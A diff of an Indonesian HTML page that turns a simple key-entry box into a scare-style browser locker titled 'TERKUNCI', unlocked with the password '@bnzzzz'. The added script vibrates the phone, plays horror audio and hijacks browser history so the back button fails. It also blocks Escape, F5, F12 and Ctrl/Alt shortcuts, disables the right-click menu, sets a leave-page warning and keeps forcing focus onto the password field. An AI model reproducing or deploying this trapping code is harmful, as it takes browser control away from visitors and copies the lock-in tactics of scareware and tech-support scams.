@@ -1,125 +1,184 @@
+
+
 <!DOCTYPE html>
 <html>
 <head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔒 TERKUNCI</title>
 <style>
-* {margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace;}
+* {margin: 0; padding: 0; box-sizing: border-box; user-select: none;}
 body {
-  background: #0a0a0a;
+  background: radial-gradient(circle at center, #1a0000 0%, #000000 70%);
   min-height: 100vh;
+  overflow: hidden;
+  font-family: 'Courier New', monospace;
   display: flex;
   justify-content: center;
   align-items: center;
-  color: #ff3333;
-  padding: 20px;
+  color: #ff0000;
 }
+
 .box {
-  background: #151515;
-  border: 2px solid #ff3333;
+  background: #111;
+  border: 3px solid #ff0000;
   border-radius: 12px;
   padding: 40px 30px;
-  max-width: 420px;
-  width: 100%;
-  box-shadow: 0 0 25px rgba(255, 0, 0, 0.25);
-}
-h2 {
+  max-width: 380px;
+  width: 90%;
   text-align: center;
-  color: #ff3333;
-  margin-bottom: 25px;
+  box-shadow: 0 0 40px rgba(255, 0, 0, 0.4);
+}
+@keyframes getar {
+  0%, 100% { transform: translateX(0); }
+  25% { transform: translateX(-8px); }
+  75% { transform: translateX(8px); }
+}
+.getar-anim {
+  animation: getar 0.3s ease-in-out;
+}
+.box h2 {
+  color: #ff0000;
+  font-size: 22px;
+  margin-bottom: 10px;
   text-transform: uppercase;
   letter-spacing: 2px;
+  text-shadow: 0 0 10px #ff0000;
 }
-.msg {
-  background: #222;
-  padding: 15px;
-  border-radius: 6px;
-  margin-bottom: 25px;
-  line-height: 1.7;
+.box p {
+  color: #ccc;
   font-size: 14px;
-  color: #ff6666;
-  text-align: center;
+  margin-bottom: 25px;
+  line-height: 1.6;
 }
-.input-kunci {
+.box input {
   width: 100%;
   padding: 14px;
   font-size: 18px;
   text-align: center;
   background: #000;
-  border: 1px solid #ff3333;
+  border: 2px solid #ff0000;
   color: #fff;
   border-radius: 6px;
   outline: none;
-  letter-spacing: 4px;
+  letter-spacing: 2px;
 }
-.tombol {
+.box button {
   width: 100%;
   padding: 14px;
-  margin-top: 18px;
-  background: #ff3333;
+  margin-top: 15px;
+  background: #ff0000;
   color: #000;
   border: none;
   font-size: 16px;
   font-weight: bold;
   border-radius: 6px;
   cursor: pointer;
-  transition: 0.2s;
 }
-.tombol:hover {background: #cc0000;}
-.hasil {
-  margin-top: 20px;
-  text-align: center;
-  font-size: 15px;
+.box button:active {background: #cc0000;}
+.salah {
+  color: #ff6666;
+  font-size: 13px;
+  margin-top: 12px;
   display: none;
 }
-.benar {color: #00ff66;}
-.salah {color: #ff6666;}
 .credit {
-  margin-top: 25px;
+  color: #333;
   font-size: 11px;
-  text-align: center;
-  color: #666;
+  margin-top: 25px;
 }
 </style>
 </head>
 <body>
 
-<div class="box">
-  <h2>🔒 JANGAN MAIN JUDI BEGO</h2>
-  
-  <div class="msg">
-    Masukkan kunci untuk melanjutkan
-  </div>
+<audio id="musik" loop>
+  <source src="https://www.soundjay.com/ambient/sounds/horror-ambient-01.mp3" type="audio/mpeg">
 
-  <input type="text" id="kunci" class="input-kunci" placeholder="Masukkan kunci...">
-  
-  <button class="tombol" onclick="cekKunci()">Buka</button>
-  
-  <div id="hasil-benar" class="hasil benar">✅ Kunci Benar! Tetap semangat, jangan nyerah!</div>
-  <div id="hasil-salah" class="hasil salah">❌ Kunci salah, coba lagi</div>
 
-  <div class="credit">
-    by: @bnzzz22
-  </div>
+<div class="box getar-anim" id="kotak">
+  <h2>🔒 TERKUNCI!</h2>
+  <p>Halaman ini telah dikunci.<br>Masukkan kata sandi untuk membukanya.</p>
+  <input type="text" id="pass" placeholder="Masukkan kata sandi...">
+  <button onclick="cek()">KIRIM</button>
+  <div class="salah" id="salah">❌ Kata sandi salah! Coba lagi</div>
+  <div class="credit">by @bnzzzz</div>
 </div>
 
 <script>
-const KUNCI_BENAR = "676767";
+const PASSWORD = "@bnzzzz";
+const musik = document.getElementById('musik');
+const kotak = document.getElementById('kotak');
 
-function cekKunci() {
-  const input = document.getElementById('kunci').value;
-  const benar = document.getElementById('hasil-benar');
-  const salah = document.getElementById('hasil-salah');
+// SAAT HALAMAN DIBUKA
+window.addEventListener('load', () => {
+  // HP BERGETAR
+  if (navigator.vibrate) {
+    navigator.vibrate([200, 100, 200, 100, 400]);
+  }
+  // COBA MULAI SUARA
+  const mulaiAudio = () => {
+    musik.volume = 0.5;
+    musik.play().catch(() => {});
+    document.removeEventListener('click', mulaiAudio);
+    document.removeEventListener('touchstart', mulaiAudio);
+  };
+  document.addEventListener('click', mulaiAudio);
+  document.addEventListener('touchstart', mulaiAudio);
+});
+
+function cek() {
+  const input = document.getElementById('pass').value;
+  const salah = document.getElementById('salah');
   
-  benar.style.display = 'none';
-  salah.style.display = 'none';
-  
-  if (input === KUNCI_BENAR) {
-    benar.style.display = 'block';
+  if (input === PASSWORD) {
+    musik.pause();
+    if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+    document.body.style.background = 'linear-gradient(#0a0a0a, #111)';
+    document.body.innerHTML = `
+      <div style="text-align:center;color:#0f0;padding:40px;">
+        <h2>✅ TERBUKA!</h2>
+        <p style="color:#aaa;margin-top:15px;">Berhasil dibuka 😄</p>
+        <p style="color:#666;font-size:12px;margin-top:30px;">Boleh tutup halaman ini</p>
+        <p style="color:#444;font-size:10px;margin-top:40px;">by @bnzzzz</p>
+      </div>
+    `;
   } else {
     salah.style.display = 'block';
+    // GETAR TEKS
+    kotak.classList.remove('getar-anim');
+    void kotak.offsetWidth;
+    kotak.classList.add('getar-anim');
+    // HP BERGETAR
+    if (navigator.vibrate) {
+      navigator.vibrate([300, 150, 300, 150, 600]);
+    }
+    document.getElementById('pass').value = '';
   }
 }
+
+// BLOKIR TOMBOL KEMBALI
+history.pushState({page: 1}, '', location.href);
+history.pushState({page: 2}, '', location.href);
+window.onpopstate = () => { history.go(1); return false; };
+
+// BLOKIR TOMBOL PINTAS
+document.addEventListener('keydown', e => {
+  const dilarang = ['Escape','F11','F5','F12','AltLeft','AltRight','ControlLeft','ControlRight','w','W','t','T','n','N','r','R','Backspace'];
+  if (dilarang.includes(e.key) || e.altKey || e.ctrlKey || e.metaKey) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }
+}, true);
+
+document.addEventListener('contextmenu', e => e.preventDefault());
+window.onbeforeunload = () => '⚠️ Masih terkunci!';
+
+// FOKUS KE INPUT
+setInterval(() => {
+  const input = document.getElementById('pass');
+  if (input && document.activeElement !== input) input.focus();
+}, 100);
 </script>
 
 </body>
 </html>
-
